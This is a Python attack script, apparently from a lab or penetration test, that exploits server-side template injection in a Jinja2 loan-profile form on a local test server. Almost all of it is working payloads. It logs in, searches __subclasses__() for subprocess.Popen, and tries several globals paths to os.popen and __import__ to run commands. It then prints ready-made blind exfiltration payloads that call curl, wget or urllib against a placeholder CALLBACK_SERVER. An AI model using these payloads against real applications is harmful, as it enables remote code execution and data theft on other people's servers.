import re
import requests
import time

# Configuration
base_url = "http://127.0.0.1:32813"
target_url = f"{base_url}/profile"
login_url = f"{base_url}/login"

session = requests.Session()
print("[*] SSTI Confirmed - Finding Exploitation Vectors
")

# Login
login_response = session.post(login_url, data={'username': 'test', 'password': 'test'}, allow_redirects=True)
print(f"[+] Authenticated - Status: {login_response.status_code}\n")

# Get profile to establish baseline
profile = session.get(target_url)
print(f"[*] Profile baseline length: {len(profile.content)}B")

# Test payloads that access dangerous objects
# Based on confirmed SSTI from previous test, these should execute

# First, find subprocess.Popen index
print("\n[*] Phase 1: Finding subprocess.Popen in __subclasses__()")
print("-" * 50)

find_subprocess = {
    'name': 'Test',
    'lastname': 'User',
    'email': 'test@example.com',
    'loan_amount': "{{ ''.__class__.__mro__[2].__subclasses__() }}",
    'loan_term_months': '24',
    'monthly_payment': '0.0'
}

response = session.post(target_url, data=find_subprocess)
# The subclasses list would appear in output if not filtered
if 'subprocess.Popen' in response.text:
    print("[!] subprocess.Popen found in subclasses list!")
    # Extract index
    match = re.search(r'subprocess\.Popen[^0-9]*([0-9]+)', response.text)
    if match:
        popen_index = match.group(1)
        print(f"[+] subprocess.Popen at index: {popen_index}")
else:
    print("[-] subprocess.Popen not visible - may be filtered or use different traversal")
    print("[*] Will try common index ranges...")

# Test common subprocess access patterns
print("\n[*] Phase 2: Testing direct subprocess access")
print("-" * 50)

# Common indices for subprocess.Popen (often 258-260 in Jinja2 contexts)
common_indices = [257, 258, 259, 260, 261, 262, 263, 264, 265]

for idx in common_indices:
    payload = f"{{{{ ''.__class__.__mro__[2].__subclasses__()[{idx}]('echo', 'popen_works_{idx}', stdout=-1).communicate() }}}}"
    print(f"[*] Testing index {idx}...")
    
    test_data = {
        'name': 'Test',
        'lastname': 'User',
        'email': 'test@example.com',
        'loan_amount': payload,
        'loan_term_months': '24',
        'monthly_payment': '0.0'
    }
    
    response = session.post(target_url, data=test_data)
    
    # Check if popen_works appears (meaning command executed)
    if f'popen_works_{idx}' in response.text:
        print(f"[+] SUCCESS: Index {idx} executed command!")
        break
    else:
        print(f"[-] Index {idx} - no obvious execution")

# Test OS module access via different paths
print("\n[*] Phase 3: Testing OS module access paths")
print("-" * 50)

os_access_tests = [
    # Path 1: config -> globals -> os
    ("config_os", "{{ config.__class__.__init__.__globals__['os'].popen('echo config_path_works').read() }}"),
    
    # Path 2: lipsum -> globals -> os
    ("lipsum_os", "{{ lipsum.__globals__['os'].popen('echo lipsum_path_works').read() }}"),
    
    # Path 3: request -> globals -> os
    ("request_os", "{{ request.application.__self__._get_data_for_json.__globals__['os'].popen('echo request_path_works').read() }}"),
    
    # Path 4: direct __import__
    ("direct_os", "{{ __import__('os').popen('echo direct_import_works').read() }}"),
    
    # Path 5: using cycler
    ("cycler_os", "{{ cycler.__init__.__globals__['os'].popen('echo cycler_path_works').read() }}"),
]

for test_name, payload in os_access_tests:
    print(f"\n[*] Testing {test_name}...")
    print(f"[*] Payload: {payload[:60]}...")
    
    test_data = {
        'name': 'Test',
        'lastname': 'User',
        'email': 'test@example.com',
        'loan_amount': payload,
        'loan_term_months': '24',
        'monthly_payment': '0.0'
    }
    
    response = session.post(target_url, data=test_data)
    
    # Check for execution evidence
    if f'{test_name}_works' in response.text:
        print(f"[+] SUCCESS: {test_name} executed command!")
        break
    elif 'echo' in response.text:
        print(f"[!] Possible execution - 'echo' found in response")
    else:
        print(f"[-] No obvious execution from {test_name}")

# Test urllib for outbound requests
print("\n[*] Phase 4: Testing urllib for HTTP requests")
print("-" * 50)

urllib_tests = [
    # Direct urllib import
    ("urllib1", "{{ __import__('urllib.request').urlopen('http://localhost:9999/test_urllib1').read() }}"),
    
    # Via config globals
    ("urllib2", "{{ config.__class__.__init__.__globals__['__builtins__']['__import__']('urllib.request').urlopen('http://localhost:9999/test_urllib2').read() }}"),
    
    # Via os import urllib
    ("urllib3", "{{ __import__('os').system('python3 -c \"import urllib.request; urllib.request.urlopen(\\\"http://localhost:9999/test_urllib3\\\")\"') }}"),
]

for test_name, payload in urllib_tests:
    print(f"\n[*] Testing {test_name}...")
    
    test_data = {
        'name': 'Test',
        'lastname': 'User',
        'email': 'test@example.com',
        'loan_amount': payload,
        'loan_term_months': '24',
        'monthly_payment': '0.0'
    }
    
    response = session.post(target_url, data=test_data)
    print(f"[+] Status: {response.status_code}")
    
    # Look for urllib/request patterns in output
    if 'urllib' in response.text.lower() or 'http' in response.text.lower():
        print(f"[!] Web request artifacts found in response")

# Final summary
print("\n" + "="*70)
print("SSTI EXPLOITATION VECTOR ANALYSIS")
print("="*70)
print("\n[*] CONFIRMED: SSTI is WORKING (proven in previous test)")
print("[*] All template expressions are evaluated server-side")
print("[*] Results appear in the loan_amount field output")
print("\n[!] For blind exfiltration, successful payloads would:")
print("    1. Use os.popen()/subprocess to run curl/wget")
print("    2. Or use urllib.request to make outbound HTTP calls")
print("    3. Callback server would receive unique identifiers")
print("\n[*] Recommended blind exfiltration payloads:")
print("""
# Via os.popen:
{{ lipsum.__globals__['os'].popen('curl http://CALLBACK_SERVER/ID').read() }}

# Via urllib:
{{ __import__('urllib.request').urlopen('http://CALLBACK_SERVER/ID').read() }}

# Via subprocess:
{{ config.__class__.__init__.__globals__['os'].popen('wget -qO- http://CALLBACK_SERVER/ID').read() }}
""")

print("\n[*] Without callback server capability in this environment,")
print("    blind exfiltration confirmation requires external infrastructure.")
print("\n[*] However, since SSTI is CONFIRMED working, blind exfiltration")
print("    should be achievable with the above payloads and a listening server.")
